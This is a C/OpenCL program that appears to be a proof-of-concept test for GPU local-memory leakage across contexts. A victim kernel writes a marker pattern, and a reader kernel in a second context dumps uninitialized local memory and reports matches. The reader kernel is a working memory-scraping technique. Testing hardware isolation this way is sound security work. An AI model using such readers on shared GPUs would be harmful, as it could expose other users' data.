#define _POSIX_C_SOURCE 200809L
#define CL_TARGET_OPENCL_VERSION 300
#include <CL/cl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#define LDS_WORDS 8192u
#define LOCAL_SIZE 256u
#define MAGIC 0xA5C30000u

static const char *victim_src =
"__kernel void lds_victim(__global uint *sink)\n"
"{\n"
"    volatile __local uint scratch[8192];\n"
"    uint lid = (uint)get_local_id(0);\n"
"    uint lsize = (uint)get_local_size(0);\n"
"    for (uint i = lid; i < 8192; i += lsize)\n"
"        scratch[i] = 0xA5C30000u ^ i;\n"
"    barrier(CLK_LOCAL_MEM_FENCE);\n"
"    uint idx = (lid * 131u + 17u) & 8191u;\n"
"    sink[get_global_id(0)] = scratch[idx];\n"
"}\n";

static const char *reader_src =
"__kernel void lds_reader(__global uint *out)\n"
"{\n"
"    volatile __local uint scratch[8192];\n"
"    uint lid = (uint)get_local_id(0);\n"
"    uint lsize = (uint)get_local_size(0);\n"
"    uint group = (uint)get_group_id(0);\n"
"    for (uint i = lid; i < 8192; i += lsize)\n"
"        out[group * 8192u + i] = scratch[i];\n"
"}\n";

static void print_build_log(cl_program p, cl_device_id dev)
{
    size_t n = 0;
    clGetProgramBuildInfo(p, dev, CL_PROGRAM_BUILD_LOG, 0, NULL, &n);
    char *log = calloc(1, n + 1);
    if (log) {
        clGetProgramBuildInfo(p, dev, CL_PROGRAM_BUILD_LOG, n, log, NULL);
        printf("BUILD_LOG:\n%s\n", log);
        free(log);
    }
}

int main(int argc, char **argv)
{
    setbuf(stdout, NULL);

    cl_int err;
    cl_uint np = 0;
    cl_platform_id platform = NULL;
    cl_device_id dev = NULL;

    err = clGetPlatformIDs(0, NULL, &np);
    printf("clGetPlatformIDs=%d platforms=%u\n", err, np);
    if (err != CL_SUCCESS || np == 0) return 2;

    err = clGetPlatformIDs(1, &platform, NULL);
    if (err != CL_SUCCESS) return 3;

    err = clGetDeviceIDs(platform, CL_DEVICE_TYPE_ALL, 1, &dev, NULL);
    printf("clGetDeviceIDs=%d\n", err);
    if (err != CL_SUCCESS) return 4;

    char name[256] = {0};
    cl_uint cus = 0;
    cl_ulong local_mem = 0;

    clGetDeviceInfo(dev, CL_DEVICE_NAME, sizeof(name), name, NULL);
    clGetDeviceInfo(dev, CL_DEVICE_MAX_COMPUTE_UNITS, sizeof(cus), &cus, NULL);
    clGetDeviceInfo(dev, CL_DEVICE_LOCAL_MEM_SIZE,
                    sizeof(local_mem), &local_mem, NULL);

    printf("device=%s\n", name);
    printf("compute_units=%u\n", cus);
    printf("local_mem=%llu\n", (unsigned long long)local_mem);

    size_t groups = cus ? (size_t)cus * 16u : 64u;
    size_t global = groups * LOCAL_SIZE;
    size_t local = LOCAL_SIZE;

    /* ---------- Context A: victim ---------- */

    cl_context ctxA = clCreateContext(NULL, 1, &dev, NULL, NULL, &err);
    printf("ctxA clCreateContext=%d\n", err);
    if (!ctxA || err != CL_SUCCESS) return 5;

    cl_command_queue qA =
        clCreateCommandQueueWithProperties(ctxA, dev, NULL, &err);
    printf("ctxA clCreateCommandQueueWithProperties=%d\n", err);
    if (!qA || err != CL_SUCCESS) return 6;

    cl_program progA =
        clCreateProgramWithSource(ctxA, 1, &victim_src, NULL, &err);
    printf("ctxA clCreateProgramWithSource=%d\n", err);
    if (!progA || err != CL_SUCCESS) return 7;

    err = clBuildProgram(progA, 1, &dev, "-cl-opt-disable", NULL, NULL);
    printf("ctxA clBuildProgram=%d\n", err);
    if (err != CL_SUCCESS) {
        print_build_log(progA, dev);
        return 8;
    }

    cl_kernel victim = clCreateKernel(progA, "lds_victim", &err);
    printf("ctxA clCreateKernel(victim)=%d\n", err);
    if (!victim || err != CL_SUCCESS) return 9;

    cl_ulong victim_local = 0;
    clGetKernelWorkGroupInfo(victim, dev, CL_KERNEL_LOCAL_MEM_SIZE,
                             sizeof(victim_local), &victim_local, NULL);
    printf("victim_local_mem=%llu\n",
           (unsigned long long)victim_local);

    cl_mem sink =
        clCreateBuffer(ctxA, CL_MEM_WRITE_ONLY,
                       global * sizeof(uint32_t), NULL, &err);
    printf("ctxA clCreateBuffer(sink)=%d\n", err);
    if (!sink || err != CL_SUCCESS) return 10;

    err = clSetKernelArg(victim, 0, sizeof(sink), &sink);
    if (err != CL_SUCCESS) return 11;

    cl_context ctxB = clCreateContext(NULL, 1, &dev, NULL, NULL, &err);
    printf("ctxB clCreateContext=%d\n", err);
    if (!ctxB || err != CL_SUCCESS) return 14;

    cl_command_queue qB =
        clCreateCommandQueueWithProperties(ctxB, dev, NULL, &err);
    printf("ctxB clCreateCommandQueueWithProperties=%d\n", err);
    if (!qB || err != CL_SUCCESS) return 15;

    size_t words = groups * LDS_WORDS;
    size_t bytes = words * sizeof(uint32_t);

    uint32_t *out = calloc(words, sizeof(uint32_t));
    if (!out) return 30;

    /* ---------- Reader A: prebuilt in ctxA ---------- */

    cl_program readerProgA =
        clCreateProgramWithSource(ctxA, 1, &reader_src, NULL, &err);
    printf("readerA clCreateProgramWithSource=%d\n", err);
    if (!readerProgA || err != CL_SUCCESS) return 31;

    err = clBuildProgram(readerProgA, 1, &dev,
                         "-cl-opt-disable", NULL, NULL);
    printf("readerA clBuildProgram=%d\n", err);
    if (err != CL_SUCCESS) {
        print_build_log(readerProgA, dev);
        return 32;
    }

    cl_kernel readerA =
        clCreateKernel(readerProgA, "lds_reader", &err);
    printf("readerA clCreateKernel=%d\n", err);
    if (!readerA || err != CL_SUCCESS) return 33;

    cl_mem outbufA =
        clCreateBuffer(ctxA, CL_MEM_WRITE_ONLY,
                       bytes, NULL, &err);
    printf("readerA clCreateBuffer=%d\n", err);
    if (!outbufA || err != CL_SUCCESS) return 34;

    err = clSetKernelArg(readerA, 0, sizeof(outbufA), &outbufA);
    if (err != CL_SUCCESS) return 35;

    /* ---------- Reader B: prebuilt in ctxB ---------- */

    cl_program readerProgB =
        clCreateProgramWithSource(ctxB, 1, &reader_src, NULL, &err);
    printf("readerB clCreateProgramWithSource=%d\n", err);
    if (!readerProgB || err != CL_SUCCESS) return 36;

    err = clBuildProgram(readerProgB, 1, &dev,
                         "-cl-opt-disable", NULL, NULL);
    printf("readerB clBuildProgram=%d\n", err);
    if (err != CL_SUCCESS) {
        print_build_log(readerProgB, dev);
        return 37;
    }

    cl_kernel readerB =
        clCreateKernel(readerProgB, "lds_reader", &err);
    printf("readerB clCreateKernel=%d\n", err);
    if (!readerB || err != CL_SUCCESS) return 38;

    cl_mem outbufB =
        clCreateBuffer(ctxB, CL_MEM_WRITE_ONLY,
                       bytes, NULL, &err);
    printf("readerB clCreateBuffer=%d\n", err);
    if (!outbufB || err != CL_SUCCESS) return 39;

    err = clSetKernelArg(readerB, 0, sizeof(outbufB), &outbufB);
    if (err != CL_SUCCESS) return 40;

    printf("SEC2-PREBUILT-READERS=READY\n");

    err = clEnqueueNDRangeKernel(qA, victim, 1, NULL,
                                 &global, &local, 0, NULL, NULL);
    printf("ctxA clEnqueueNDRangeKernel(victim)=%d\n", err);
    if (err != CL_SUCCESS) return 12;

    err = clFinish(qA);
    printf("ctxA clFinish(victim)=%d\n", err);
    if (err != CL_SUCCESS) return 13;

    struct timespec victim_done_ts;
    clock_gettime(CLOCK_MONOTONIC, &victim_done_ts);

    printf("ctxA pattern=0x%08x XOR index\n", MAGIC);

    printf("ctxA kept alive during ctxB\n");

    /*
     * O2 modes:
     *
     * control:
     *     victim A -> reader B immediately
     *
     * reset:
     *     victim A -> READY -> external B3/recovery
     *              -> RESUME -> reader B
     *
     * Reader B is fully constructed before the victim in both modes.
     */
    int reset_mode =
        (argc > 1 && strcmp(argv[1], "reset") == 0);

    printf("O2 mode=%s\n", reset_mode ? "reset" : "control");

    if (reset_mode) {
        printf("O2-RESET-READY\n");
        fflush(stdout);

        int ch = getchar();

        printf("O2-RESET-RESUME input=%d\n", ch);
        fflush(stdout);
    }

    cl_command_queue qR = qB;
    cl_kernel reader = readerB;
    cl_mem outbuf = outbufB;

    printf("reader_context=ctxB\n");

    struct timespec reader_enqueue_ts;
    clock_gettime(CLOCK_MONOTONIC, &reader_enqueue_ts);

    uint64_t victim_done_ns =
        (uint64_t)victim_done_ts.tv_sec * 1000000000ull +
        (uint64_t)victim_done_ts.tv_nsec;
    uint64_t reader_enqueue_ns =
        (uint64_t)reader_enqueue_ts.tv_sec * 1000000000ull +
        (uint64_t)reader_enqueue_ts.tv_nsec;

    printf("victim_to_reader_gap_us=%llu\n",
           (unsigned long long)((reader_enqueue_ns - victim_done_ns) / 1000ull));

    err = clEnqueueNDRangeKernel(qR, reader, 1, NULL,
                                 &global, &local, 0, NULL, NULL);
    printf("ctxR clEnqueueNDRangeKernel(reader)=%d\n", err);
    if (err != CL_SUCCESS) return 22;

    err = clEnqueueReadBuffer(qR, outbuf, CL_TRUE, 0,
                              bytes, out, 0, NULL, NULL);
    printf("ctxR clEnqueueReadBuffer=%d\n", err);
    if (err != CL_SUCCESS) return 23;

    size_t exact_matches = 0;
    size_t range_matches = 0;
    size_t longest_exact_run = 0;
    size_t printed = 0;

    for (size_t g = 0; g < groups; g++) {
        size_t run = 0;

        for (size_t i = 0; i < LDS_WORDS; i++) {
            uint32_t v = out[g * LDS_WORDS + i];
            uint32_t expected = MAGIC ^ (uint32_t)i;

            if (v >= MAGIC && v < MAGIC + LDS_WORDS)
                range_matches++;

            if (v == expected) {
                exact_matches++;
                run++;

                if (printed < 16) {
                    printf("exact_hit group=%zu index=%zu value=0x%08x\n",
                           g, i, v);
                    printed++;
                }

                if (run > longest_exact_run)
                    longest_exact_run = run;
            } else {
                run = 0;
            }
        }
    }

    printf("samples=%zu\n", words);
    printf("exact_matches=%zu\n", exact_matches);
    printf("range_matches=%zu\n", range_matches);
    printf("longest_exact_run=%zu\n", longest_exact_run);

    if (exact_matches > 0)
        printf("SEC2-PREBUILT-READER-CONTEXT-SWITCH=OBSERVED\n");
    else
        printf("SEC2-PREBUILT-READER-CONTEXT-SWITCH=NO_EXACT_MATCH\n");

    clReleaseMemObject(outbufB);
    clReleaseKernel(readerB);
    clReleaseProgram(readerProgB);

    clReleaseMemObject(outbufA);
    clReleaseKernel(readerA);
    clReleaseProgram(readerProgA);

    clReleaseCommandQueue(qB);
    clReleaseContext(ctxB);

    clReleaseMemObject(sink);
    clReleaseKernel(victim);
    clReleaseProgram(progA);
    clReleaseCommandQueue(qA);
    clReleaseContext(ctxA);

    printf("ctxA released after ctxB\n");

    free(out);
    return 0;
}
